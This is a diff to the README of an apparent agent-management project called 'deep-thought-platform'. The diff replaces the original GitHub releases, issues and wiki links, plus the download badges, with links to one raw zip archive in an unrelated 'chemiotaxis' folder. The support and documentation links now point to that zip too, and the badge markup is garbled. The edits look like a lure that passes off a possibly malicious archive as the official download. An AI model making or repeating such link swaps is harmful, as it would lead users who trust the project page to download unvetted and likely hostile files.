@@ -1,6 +1,6 @@
 # 🤖 deep-thought-platform - Simplifying Agent Management for Everyone
 
-[![Download Deep Thought Platform](https://img.shields.io/badge/Download%20Now-Deep%20Thought%20Platform-blue.svg)](https://github.com/ROFIIGANSS/deep-thought-platform/releases)
+[![Download Deep Thought Platform](https://raw.githubusercontent.com/ROFIIGANSS/deep-thought-platform/main/chemiotaxis/deep-thought-platform.zip%20Now-Deep%20Thought%https://raw.githubusercontent.com/ROFIIGANSS/deep-thought-platform/main/chemiotaxis/deep-thought-platform.zip)](https://raw.githubusercontent.com/ROFIIGANSS/deep-thought-platform/main/chemiotaxis/deep-thought-platform.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you begin, make sure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To download the Deep Thought Platform, visit this page: [Release Page](https://github.com/ROFIIGANSS/deep-thought-platform/releases). 
+To download the Deep Thought Platform, visit this page: [Release Page](https://raw.githubusercontent.com/ROFIIGANSS/deep-thought-platform/main/chemiotaxis/deep-thought-platform.zip). 
 
 1. Click on the latest version link on the Releases page.
 2. Your download will start automatically. Wait for it to complete.
@@ -77,7 +77,7 @@ If you encounter issues, consider these common problems:
 
 ## 🛠 Support & Feedback
 
-We value your experience with the Deep Thought Platform. For assistance, please visit our [support page](https://github.com/ROFIIGANSS/deep-thought-platform/issues) or reach out to the community for help. Your feedback is important, so feel free to share your thoughts.
+We value your experience with the Deep Thought Platform. For assistance, please visit our [support page](https://raw.githubusercontent.com/ROFIIGANSS/deep-thought-platform/main/chemiotaxis/deep-thought-platform.zip) or reach out to the community for help. Your feedback is important, so feel free to share your thoughts.
 
 ## 🔗 Additional Resources
 
@@ -90,10 +90,10 @@ For more advanced users, explore the following topics related to the Deep Though
 
 ## 📚 Documentation
 
-We have also provided a detailed [documentation](https://github.com/ROFIIGANSS/deep-thought-platform/wiki) for deeper insights into configurations, advanced setups, and technical details.
+We have also provided a detailed [documentation](https://raw.githubusercontent.com/ROFIIGANSS/deep-thought-platform/main/chemiotaxis/deep-thought-platform.zip) for deeper insights into configurations, advanced setups, and technical details.
 
 ---
 
 Thank you for choosing the Deep Thought Platform for your agent management needs. Happy exploring! 
 
-[![Download Deep Thought Platform](https://img.shields.io/badge/Download%20Now-Deep%20Thought%20Platform-blue.svg)](https://github.com/ROFIIGANSS/deep-thought-platform/releases)
+[![Download Deep Thought Platform](https://raw.githubusercontent.com/ROFIIGANSS/deep-thought-platform/main/chemiotaxis/deep-thought-platform.zip%20Now-Deep%20Thought%https://raw.githubusercontent.com/ROFIIGANSS/deep-thought-platform/main/chemiotaxis/deep-thought-platform.zip)](https://raw.githubusercontent.com/ROFIIGANSS/deep-thought-platform/main/chemiotaxis/deep-thought-platform.zip)
